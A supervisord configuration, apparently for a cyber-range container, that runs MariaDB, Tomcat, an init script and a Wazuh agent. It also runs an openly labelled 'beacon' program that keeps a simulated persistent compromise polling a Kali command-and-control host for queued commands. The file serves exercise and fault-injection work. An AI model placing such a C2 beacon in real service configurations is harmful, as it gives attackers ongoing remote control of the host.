[supervisord]
nodaemon=true

[program:mariadb]
command=/bin/bash -c "if [ ! -d /var/lib/mysql/mysql ]; then mysql_install_db --user=mysql --datadir=/var/lib/mysql; fi && exec /usr/sbin/mysqld --datadir=/var/lib/mysql --user=mysql"
autostart=true
autorestart=true
priority=5

[program:init]
command=/init.sh
autostart=true
autorestart=false
priority=7
startsecs=0
startretries=1
stdout_logfile=/var/log/supervisor/init.log
stderr_logfile=/var/log/supervisor/init.err

[program:tomcat]
command=/bin/bash -c "sleep 10 && /usr/local/tomcat/bin/catalina.sh run"
autostart=true
autorestart=true
priority=10

[program:wazuh-agent]
command=/bin/bash -c "if getent hosts wazuh >/dev/null 2>&1; then /var/ossec/bin/wazuh-control start; else echo '[scadalts] Wazuh not in DNS, skipping agent start'; fi; sleep infinity"
autostart=true
autorestart=false
priority=20
stdout_logfile=/var/log/supervisor/wazuh-agent.log
stderr_logfile=/var/log/supervisor/wazuh-agent.err

# Cyber fault-injection tooling (see docs/cyber-vs-physical-fault-injection-design.md).
# Represents a persistent compromise that already exists before any exercise
# starts - it's always running, beaconing to Kali, and does nothing unless
# Kali's C2 listener has a command queued for it.
[program:beacon]
command=/usr/bin/python3 /opt/cyber_injects/beacon_client.py --c2-host 192.168.90.6 --target-host 192.168.95.2
autostart=true
autorestart=true
priority=30
stdout_logfile=/var/log/supervisor/beacon.log
stderr_logfile=/var/log/supervisor/beacon.err
